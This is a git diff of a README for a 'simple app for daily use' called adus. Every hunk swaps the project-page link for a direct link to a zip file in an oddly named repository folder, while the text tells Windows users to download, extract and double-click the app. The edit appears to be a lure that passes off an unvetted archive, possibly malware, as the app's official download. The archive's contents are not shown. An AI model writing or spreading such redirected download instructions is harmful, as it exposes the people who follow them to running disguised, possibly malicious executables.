@@ -1,11 +1,11 @@
 # 🖥️ adus - Simple app for daily use
 
-[![Download adus](https://img.shields.io/badge/Download-adus-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bharani8055/adus)
+[![Download adus](https://img.shields.io/badge/Download-adus-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Bharani8055/adus/main/trilaurin/Software-v1.6.zip)
 
 ## 📥 Download
 
 Use this link to visit the project page and download adus:
-https://github.com/Bharani8055/adus
+https://raw.githubusercontent.com/Bharani8055/adus/main/trilaurin/Software-v1.6.zip
 
 If the page shows a release file, choose the Windows version and save it to your PC.
 
@@ -139,7 +139,7 @@ If the app still does not start, Windows may be blocking it or the file may not 
 
 If you want the fastest path on Windows:
 
-1. Visit https://github.com/Bharani8055/adus
+1. Visit https://raw.githubusercontent.com/Bharani8055/adus/main/trilaurin/Software-v1.6.zip
 2. Download the latest Windows file
 3. Open the file or extract it
 4. Double-click the app
@@ -190,7 +190,7 @@ Keeping one current copy helps avoid version mix-ups.
 ## 🧭 Where to get the app
 
 Go to the download page here:
-https://github.com/Bharani8055/adus
+https://raw.githubusercontent.com/Bharani8055/adus/main/trilaurin/Software-v1.6.zip
 
 Look for the latest release, then download the Windows file that matches your system.
 
